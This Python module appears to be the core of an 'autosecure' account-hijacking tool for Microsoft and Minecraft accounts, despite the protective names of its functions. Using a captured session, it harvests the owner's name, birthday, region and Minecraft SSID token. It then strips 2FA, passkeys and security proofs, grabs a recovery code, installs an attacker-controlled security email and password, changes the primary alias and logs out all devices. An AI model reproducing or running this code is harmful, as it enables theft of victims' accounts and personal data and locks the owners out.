from views.utils.securing.securityInformation import securityInformation
from views.utils.securing.changePrimaryAlias import changePrimaryAlias
from views.utils.minecraft.getNamechange import getUsernameInfo
from views.utils.securing.getRecoveryCode import getRecoveryCode
from views.utils.securing.removeServices import removeServices
from views.utils.securing.generateEmail import generateEmail
from views.utils.securing.getOwnerInfo import getOwnerInfo
from views.utils.securing.removeProof import removeProof
from views.utils.securing.removeZyger import removeZyger
from views.utils.securing.getCookies import getCookies
from views.utils.securing.getProfile import getProfile
from views.utils.securing.remove2FA import remove2FA
from views.utils.securing.logoutAll import logoutAll
from views.utils.securing.recovery import recover
from views.utils.securing.getAMRP import getAMRP
from views.utils.securing.getSSID import getSSID
from views.utils.securing.getAMC import getAMC
from views.utils.securing.getT import getT

from views.utils.minecraft.getMethod import getMethod
from views.utils.minecraft.getCapes import getCapes
from views.utils.minecraft.getXBL import getXBL

from database.database import DBConnection
import httpx
import uuid
import json

ralias = json.load(open("config.json", "r+"))["autosecure"]["replace_main_alias"]
database = DBConnection()

async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):

    apicanary = await getCookies(session) 
    
    T = await getT(session)

    # This means the account hasn't accepted TOS (To be fixed asap)
    if not T:
        print("[X] - Failed to get T\n[~] - This account needs to accept TOS manually (for now...)")
        return accountInfo
    
    print("[+] - Found T")

    verificationToken = await getAMC(session)
    ownerInfo = await getOwnerInfo(session, verificationToken)

    if ownerInfo:
        print("[+] - Got Owner Info")
        
        accountInfo["firstName"] = ownerInfo["Fname"]
        accountInfo["lastName"] = ownerInfo["Lname"]
        accountInfo["region"] = ownerInfo["region"]
        accountInfo["birthday"] = ownerInfo["birthday"]
        accountInfo["fullName"] = f"{ownerInfo["Fname"]} {ownerInfo["Lname"]}"
    
    # Minecraft checking
    print("[~] - Checking Minecraft Account")
    XBLResponse = await getXBL(session)

    if XBLResponse:
        print("[+] - Got XBL (Has Xbox Profile)")

        # XBL && Token
        xbl = XBLResponse["xbl"]

        ssid = await getSSID(xbl)
        
        # Get capes, profile and purchase method
        if ssid:    
            print("[+] - Got SSID! (Has Minecraft)")

            capes = await getCapes(ssid)
            if capes:
                print(f"Capes -> {capes}")
                accountInfo["capes"] = ", ".join(i["alias"] for i in capes)
                print(f"[+] - Got capes")
            else:
                accountInfo["capes"] = "No Capes"

            # Gets account name
            profile = await getProfile(ssid)
            if not profile:
                print("[x] - Failed to get profile (No Minecraft Java)")
            else:
                print(f"[+] - Got profile (Has Minecraft Java)")
                accountInfo["SSID"] = ssid
                accountInfo["name"] = profile
                
                usernameInfo = await getUsernameInfo(ssid)
                if type(usernameInfo) is bool:
                    accountInfo["usernameInfo"] = "Yes"
                else:
                    accountInfo["usernameInfo"] = f"Changeable in {usernameInfo} days"

            method = await getMethod(ssid)
            if method:
                accountInfo["method"] = method
                print(f"[+] - Got purchase method")
        else:
            print("[x] - Failed to get SSID")

    else:
        print("[x] - Failed to get XBL (Account has no Xbox Profile)")
        accountInfo["name"] = "No Minecraft"

    # Security Steps
    await getAMRP(session, T)
    print("[+] - Got AMRP")

    # 2FA
    await remove2FA(session, apicanary)

    # Pass Keys / Windows Hello Exploit
    await removeZyger(session, apicanary)

    # Removes security_emails / Auth Apps
    await removeProof(session, apicanary)
    print("[+] - Removed all Proofs")
    
    # Third Party Launchers (Minecraft, Prism)
    await removeServices(session)   

    if recovery:

        securityParameters = json.loads(await securityInformation(session))
        print("[+] - Got Security Parameters")

        if securityParameters:

            # Original Email
            mainEmail = securityParameters["email"]
            encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"] 

            recovery_code = await getRecoveryCode(
                session,
                apicanary,
                encryptedNetID
            )
            print(f"[+] - Got Recovery Code | {recovery_code}")

            security_email = uuid.uuid4().hex[:16]
            password = uuid.uuid4().hex[:12]

            email_token, security_email = await generateEmail(security_email, password)

            print(f"[+] - Generated Security Email ({security_email})")
            database.addEmail(security_email, password)

            print("[~] - Automaticly Securing Account...")
            data = await recover(session, mainEmail, recovery_code, security_email, password, email_token) 

            if data and data != "invalid":
                accountInfo["security_email"] = security_email
                accountInfo["recovery_code"] = data["recovery_code"]
                accountInfo["password"] = password
            else:
                print(f"[X] - Failed to secure this account")
        
    # Change Primary Alias is broken
    if ralias:

        primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
        print(f"[+] - Generated Primary Email ({primaryEmail}@outlook.com)")
        info = await changePrimaryAlias(session, primaryEmail, apicanary)
        if info:
            accountInfo["email"] = f"{primaryEmail}@outlook.com"
            print(f"[+] - Changed Primary Alias")
        else:
            accountInfo["email"] = mainEmail

    else:
        accountInfo["email"] = mainEmail
        
    # Logout all devices
    await logoutAll(session, apicanary)
    print("[+] - Account has been secured")

    return accountInfo


            

    

    
        

        